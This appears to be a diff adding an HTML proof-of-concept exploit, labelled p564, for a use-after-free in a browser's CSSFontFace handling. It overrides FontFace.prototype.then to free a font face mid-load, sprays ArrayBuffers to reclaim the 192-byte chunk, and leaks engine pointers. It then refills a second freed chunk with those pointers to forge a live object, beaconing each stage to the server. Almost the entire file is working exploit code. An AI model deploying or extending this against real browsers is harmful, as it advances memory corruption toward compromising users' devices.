@@ -1,0 +1,80 @@
+<!--
+  p564: two stages.  Stage 1 leaks the qwords the engine writes into the reclaimed
+  192-byte chunk.  Stage 2 frees a second CSSFontFace, refills the chunk with those
+  engine pointers at +0x58 and +0x68, and lets the load continue.
+
+  Survival with a resolved promise means the engine accepts our template as a live
+  CSSFontFace -- the prerequisite for steering one of its fields.  Measured on 14.10
+  (2026-10-29): P564-S1-HIT-b2-n9, P564-S2-RESOLVED, P564-S2-ALIVE-1.
+-->
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>p564 fontface reclaim template</title>
+<script>
+/* two stages: stage 1 leaks the two engine-written qwords out of a reclaimed 192B chunk,
+   stage 2 frees a second CSSFontFace and refills the chunk with those exact engine pointers,
+   then asks the engine to keep using the object. Survival = the template is accepted. */
+function b(m){try{var x=new XMLHttpRequest();x.open('GET','/beacon/'+m+'?t='+Date.now(),false);x.send(null);}catch(e){}}
+var K=8, SIZE=192, styleEl=null, firedHere=false, stage=0, leaked={p58:null,p68:null};
+function hex(v){return ('0' + v.toString(16)).slice(-2);}
+function setupFace(name, css){
+  styleEl = document.createElement('style');
+  styleEl.textContent = css;
+  document.head.appendChild(styleEl);
+  var A = new FontFace(name, 'local(Helvetica)', { unicodeRange: 'U+0041' });
+  document.fonts.add(A); void A.loaded; window.__alive.push(A);
+}
+function installGetter(){
+  firedHere = false;
+  Object.defineProperty(FontFace.prototype, 'then', {
+    configurable: true,
+    get: function(){
+      if (firedHere) return undefined;
+      firedHere = true;
+      if (styleEl) styleEl.remove();
+      try { document.fonts.delete(this); } catch (e) {}
+      document.body.offsetHeight;
+      window.__map = [];
+      for (var k = 0; k < K; k++) {
+        var ab = new ArrayBuffer(SIZE);
+        var v = new Uint8Array(ab);
+        if (stage === 1 && leaked.p58) { v.set(leaked.p58, 0x58); v.set(leaked.p68, 0x68); }
+        window.__map.push({ size: SIZE, view: v });
+      }
+      try { document.fonts.check('1em s0'); } catch (e) {}
+      return undefined;
+    },
+    set: function(){}
+  });
+}
+function grab(view, off){ var a=[]; for (var i=0;i<8;i++) a.push(view[off+i]); return a; }
+function start(){
+  window.__alive = [];
+  stage = 0;
+  setupFace('f0', "@font-face { font-family: s0; src: local(Arial); unicode-range: U+0042; }");
+  installGetter();
+  b('P564-SETUP');
+  document.fonts.load('1em f0, s0', 'AB').then(function(){ b('P564-S1-RESOLVED'); }, function(){ b('P564-S1-REJECTED'); });
+  setTimeout(scan1, 120);
+}
+function scan1(){
+  var m = window.__map || [], best = -1, nz = 0;
+  for (var i = 0; i < m.length; i++) {
+    var v = m[i].view, n = 0;
+    for (var j = 0; j < v.length; j++) if (v[j] !== 0) n++;
+    if (n > nz) { nz = n; best = i; }
+  }
+  if (best < 0) { b('P564-S1-CLEAN'); return; }
+  var v = m[best].view;
+  leaked.p58 = grab(v, 0x58); leaked.p68 = grab(v, 0x68);
+  var s=''; for (var j=0;j<v.length;j++) if (v[j]!==0) s += hex(v[j]);
+  b('P564-S1-HIT-b' + best + '-n' + nz + '-' + s);
+  stage = 1;
+  setupFace('f1', "@font-face { font-family: s1; src: local(Arial); unicode-range: U+0043; }");
+  installGetter();
+  b('P564-S2-SETUP');
+  document.fonts.load('1em f1, s1', 'AB').then(function(){ b('P564-S2-RESOLVED'); }, function(){ b('P564-S2-REJECTED'); });
+  setTimeout(function(){ b('P564-S2-ALIVE-' + (firedHere?1:0)); }, 600);
+}
+function run(){ start(); }
+if (document.readyState === 'complete' || document.readyState === 'interactive') setTimeout(run, 0);
+else document.addEventListener('DOMContentLoaded', run);
+</script></head><body><p>p564 fontface reclaim template</p></body></html>
